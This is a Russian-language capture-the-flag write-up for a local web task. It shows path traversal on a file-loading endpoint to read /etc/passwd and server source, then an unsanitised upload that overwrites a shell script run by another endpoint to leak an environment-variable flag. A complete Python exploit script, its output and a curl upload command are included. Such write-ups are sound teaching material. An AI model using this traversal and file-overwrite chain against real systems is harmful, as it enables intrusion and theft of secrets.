# Хитрый краб чайке не товарищ

## Исследование

После деплоя таска мы получаем почти чистую страничку. На ней указан только странный файл `flag.drawio`. Это формат файла онлайн конструктора диаграмм draw.io и внутри только зачётный мем с жабой.

Помимо этого вы могли заметить, что в URL находится замечательный небезопасный формат отображения файлов:
```
http://127.0.0.1:7509/load?file=./
```

Что позволяет нам предположить, что страничка рендерит содержимое не какого-то абстрактого хранилища, а файлы прямо с файловой системы.

Подтвердим эту теорию, попытавшись открыть файл `/etc/passwd`: `http://127.0.0.1:7509/load?file=../../../../etc/passwd`. При выполнении этого запроса в ваше распоряжение поступит passwd, а это означает, что у нас тут LFR (Local File Read) через path traversal.

Пробуем читать родительскую директорию через `http://127.0.0.1:7509/load?file=..` и видим следующую структуру:
```
./clear.sh
./uploads/
./static/
./templates/
./main.py
```

В `main.py` лежит код сервера и, после его анализа, можно подметить важные детали:

1) Флаг нигде не выводится, но он хранится в переменной окружения `FLAG`:
    ```
    flag = r'CTF{EXAMPLE}' if 'FLAG' not in os.environ else os.environ['FLAG'].replace('"','')
    ```
2) У нас есть ручка `http://127.0.0.1:7509/upload`, которая позволяет загружать файлы на сервер. Стоит заметить, что она это делает небезопасно - нет сантизации имени файла (для Flask - это функция `secure_filename()`). Это позволяет нам загружать файлы на систему в любое место, т.е уязвимость Local File Inclusion.
3) У нас ручка `http://127.0.0.1:7509/clear_cache`, которая выполняет скрипт `clear.sh`.

## Эксплуатация

У нас каре - уязвимости path traversal, LFR, LFI и RCE. Путь эксплуатации следующий:

1) Загружаем файл, который подменит `clear.sh`. Т.к. имя скрипта захардкожено - мы должны оставить его как есть. Но никакой проверки целостности у нас нет, поэтому внутрь скрипта мы можем положить код, который делает что угодно. Поэтому запомним, что имя загружаемого файла должно быть `../clear.sh`.
2) В скрипт нужно положить код, который куда-то выведет флаг из переменной окружения. Тут делаем просто:
   ```
    #!/bin/sh
    printenv FLAG
   ```
3) Теперь этот скрипт необходимо доставить - для этого надо сформировать POST-запрос на `/upload` с правильным именем файлы `../clear.sh` и содержимым, выводящим флаг в удобное для нас место. Сразу в скрипте дернем `/clear_cache` чтобы получить флаг. Вот такой код это делает:
   ```
    #!/usr/bin/env python

    import requests
    import sys

    if len(sys.argv) != 2:
        print("Use: {} <address>".format(sys.argv[0]))
        sys.exit()
        
    server = sys.argv[1].strip().replace("http://", "").split("/")[0]

    filename = "../clear.sh"
    filecontent = \
    '''
    #!/bin/sh
    printenv FLAG
    '''

    req = requests.post("http://{}/upload".format(server), files={ 'file': (filename, filecontent)} )
    print("[!] POST = ", req.status_code)
    flag = requests.get("http://{}/clear_cache".format(server))
    print(flag.text)

   ```

   ```
    -> $ python3 sploit.py 127.0.0.1:7509
    [!] POST =  200
    "crab{lfi_lfr_path_traversal_the_classic_trio_*}"
   ```

    Или можно для загрузки `clear.sh` обойтись без питона и заюзать curl:
    ```
        curl http://<address>/upload --form file='@clear.sh;filename=../clear.sh' -X POST
    ```

    А потом просто в браузере дёрнуть `/clear_cache`